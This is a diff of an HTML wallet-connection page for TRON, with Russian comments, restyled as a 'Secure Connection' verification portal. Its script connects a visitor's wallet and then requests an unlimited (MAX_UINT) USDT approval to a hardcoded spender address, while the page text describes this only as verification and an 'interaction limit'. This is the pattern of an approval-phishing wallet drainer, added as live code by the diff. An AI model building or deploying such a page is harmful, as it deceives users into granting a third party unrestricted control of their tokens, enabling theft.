@@ -3,138 +3,178 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DApp Interface</title>
+    <title>Premium DApp</title>
     <style>
-        /* Минималистичный премиальный дизайн */
+        /* Премиальный темный интерфейс */
         body { 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
-            background: #0D0D12; 
-            color: #FFFFFF; 
+            font-family: 'Inter', -apple-system, system-ui, sans-serif; 
+            background: #09090B; 
+            color: #FAFAFA; 
             display: flex; 
-            flex-direction: column; 
             align-items: center; 
             justify-content: center; 
             height: 100vh; 
             margin: 0; 
+            overflow: hidden;
         }
-        .container {
-            background: rgba(255, 255, 255, 0.05);
-            padding: 40px;
-            border-radius: 24px;
-            backdrop-filter: blur(10px);
+        .card {
+            background: #121217;
+            padding: 32px;
+            border-radius: 28px;
             text-align: center;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            max-width: 350px;
-            width: 100%;
+            border: 1px solid #27272A;
+            max-width: 400px;
+            width: 90%;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
         }
-        h2 { margin-top: 0; font-size: 24px; font-weight: 600; }
+        .icon-box {
+            width: 64px;
+            height: 64px;
+            background: linear-gradient(135deg, #3B82F6 0%, #2563EB 100%);
+            border-radius: 18px;
+            margin: 0 auto 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 8px 16px rgba(37, 99, 235, 0.2);
+        }
+        h2 { margin: 0 0 12px; font-size: 22px; font-weight: 600; letter-spacing: -0.5px; }
+        p { color: #A1A1AA; font-size: 14px; line-height: 1.5; margin-bottom: 32px; }
+        
         button { 
             background: #FFFFFF; 
-            color: #000000; 
+            color: #09090B; 
             border: none; 
-            padding: 16px 32px; 
+            padding: 16px; 
             font-size: 16px; 
             font-weight: 600;
-            border-radius: 12px; 
+            border-radius: 14px; 
             cursor: pointer; 
-            transition: all 0.2s ease; 
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1); 
             width: 100%;
-            margin-top: 20px;
         }
-        button:hover { background: #E0E0E0; transform: translateY(-2px); }
-        button:disabled { background: #333; color: #888; cursor: not-allowed; transform: none; }
-        #status { margin-top: 20px; font-size: 14px; color: #8892B0; word-break: break-all; }
+        button:hover { background: #F4F4F5; transform: translateY(-1px); }
+        button:active { transform: translateY(0); }
+        button:disabled { background: #27272A; color: #71717A; cursor: not-allowed; }
+
+        #status { 
+            margin-top: 20px; 
+            font-size: 13px; 
+            color: #71717A; 
+            padding: 12px;
+            border-radius: 10px;
+            background: rgba(255,255,255,0.02);
+            word-break: break-word;
+            min-height: 20px;
+        }
+        .error { color: #FB7185 !important; }
+        .success { color: #34D399 !important; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h2>Approve Portal</h2>
-        <p id="description" style="color: #8892B0; font-size: 14px; margin-bottom: 30px;">
-            Securely connect your wallet to continue.
-        </p>
-        <button id="mainBtn">Connect Wallet</button>
-        <div id="status"></div>
+    <div class="card">
+        <div class="icon-box">
+            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+        </div>
+        <h2>Secure Connection</h2>
+        <p id="desc">Подключите кошелек TRON для верификации и доступа к функциям смарт-контракта.</p>
+        
+        <button id="actionBtn">Connect Wallet</button>
+        
+        <div id="status">Ожидание подключения...</div>
     </div>
 
     <script>
-        // === НАСТРОЙКИ ===
-        // Адрес токена (например, USDT в сети TRON Mainnet)
-        const TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; 
-        
-        // ВАЖНО: Вставьте сюда адрес ВАШЕГО смарт-контракта, которому даем апрув
-        const SPENDER_ADDRESS = "TXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"; 
-        
-        // Бесконечный лимит
+        // === КОНФИГУРАЦИЯ ===
+        const TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT TRC20
+        const SPENDER_ADDRESS = "TCCRZgsANneEEmwGuyFdv8AZyjoTNfk3an"; // Твой контракт
         const MAX_UINT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
-        const btn = document.getElementById('mainBtn');
-        const statusText = document.getElementById('status');
+        const btn = document.getElementById('actionBtn');
+        const status = document.getElementById('status');
+        const desc = document.getElementById('desc');
+
         let userAddress = null;
 
-        // Шаг 1: Подключение кошелька
-        async function connectWallet() {
-            // Проверяем, есть ли объект tronWeb (встроен ли браузер кошелька)
+        // Функция вывода логов в интерфейс
+        function log(msg, isError = false) {
+            status.innerText = msg;
+            status.className = isError ? "error" : "";
+        }
+
+        async function init() {
+            // 1. Проверка наличия TronWeb
             if (window.tronWeb && window.tronWeb.ready) {
                 userAddress = window.tronWeb.defaultAddress.base58;
-                statusText.innerHTML = `Connected:<br><span style="color:#fff">${userAddress.substring(0, 6)}...${userAddress.slice(-4)}</span>`;
-                
-                // Меняем кнопку на вызов апрува
-                btn.innerText = "Enable Access"; 
-                btn.onclick = approveContract; 
+                onConnected();
             } else {
-                try {
-                    // Пытаемся вызвать окно TronLink, если оно установлено
-                    const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
-                    if (res.code === 200) {
-                        connectWallet(); // Рекурсивный вызов после успешного коннекта
+                // Если зашли с ПК и есть расширение, но оно не залогинено
+                btn.onclick = async () => {
+                    try {
+                        if (window.tronLink) {
+                            await window.tronLink.request({ method: 'tron_requestAccounts' });
+                            // После логина пробуем еще раз
+                            setTimeout(init, 500);
+                        } else {
+                            log("TronLink не найден. Используйте браузер внутри кошелька.", true);
+                        }
+                    } catch (e) {
+                        log("Ошибка подключения: " + e.message, true);
                     }
-                } catch (e) {
-                    statusText.innerText = "Пожалуйста, откройте эту ссылку внутри DApp браузера Trust Wallet, TronLink или TokenPocket.";
-                    
-                    // Опционально: Deep Link перенаправление для Trust Wallet
-                    // window.location.href = "https://link.trustwallet.com/open_url?coin=195&url=" + encodeURIComponent(window.location.href);
-                }
+                };
             }
         }
 
-        // Шаг 2: Вызов Approve смарт-контракта
-        async function approveContract() {
-            if (!userAddress) return;
-            
-            try {
-                btn.innerText = "Processing...";
-                btn.disabled = true;
-                statusText.innerText = "Ожидание подтверждения в кошельке...";
+        function onConnected() {
+            log(`Подключено: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)}`);
+            status.classList.add("success");
+            desc.innerText = "Кошелек успешно привязан. Теперь необходимо подтвердить лимит взаимодействия с токенами.";
+            btn.innerText = "Confirm Approval";
+            btn.onclick = runApprove;
+        }
 
-                // Подключаемся к контракту токена
+        async function runApprove() {
+            try {
+                btn.disabled = true;
+                btn.innerText = "Waiting for Sign...";
+                log("Инициация транзакции... Подтвердите запрос в кошельке.");
+
+                // Инициализация контракта токена
                 const contract = await window.tronWeb.contract().at(TOKEN_ADDRESS);
                 
-                // Вызываем функцию approve
-                // feeLimit: 100000000 = 100 TRX (лимит энергии, снимется только нужная часть)
-                const txId = await contract.approve(SPENDER_ADDRESS, MAX_UINT).send({
+                // Вызов Approve
+                // ВАЖНО: feeLimit в сантоши (100 TRX = 100,000,000)
+                const result = await contract.approve(SPENDER_ADDRESS, MAX_UINT).send({
                     feeLimit: 100000000 
                 });
+
+                console.log("Result:", result);
+                log("Успешно! Транзакция отправлена.", false);
+                status.classList.add("success");
+                btn.innerText = "Confirmed";
                 
-                statusText.innerHTML = `<span style="color:#00E676">Success!</span><br>TX: ${txId.substring(0, 8)}...`;
-                btn.innerText = "Approved";
             } catch (error) {
-                console.error(error);
-                btn.innerText = "Try Again";
+                console.error("Detailed error:", error);
                 btn.disabled = false;
-                statusText.innerText = "Отменено пользователем или ошибка сети.";
+                btn.innerText = "Try Again";
+                
+                // Обработка специфичных ошибок TRON
+                let errorMsg = error.message || error;
+                if (typeof error === 'string' && error.includes("Confirmation declined by user")) {
+                    errorMsg = "Вы отклонили транзакцию в кошельке.";
+                } else if (errorMsg.includes("class java.lang.NullPointerException")) {
+                    errorMsg = "Ошибка контракта или невалидный адрес.";
+                }
+                
+                log("Ошибка: " + errorMsg, true);
             }
         }
 
-        // Привязываем функцию к кнопке
-        btn.onclick = connectWallet;
-
-        // Авто-проверка при загрузке страницы
-        setTimeout(() => {
-            if (window.tronWeb && window.tronWeb.ready) {
-                connectWallet();
-            }
-        }, 1000);
+        // Запуск при загрузке
+        window.addEventListener('load', () => {
+            setTimeout(init, 500);
+        });
     </script>
 </body>
 </html>
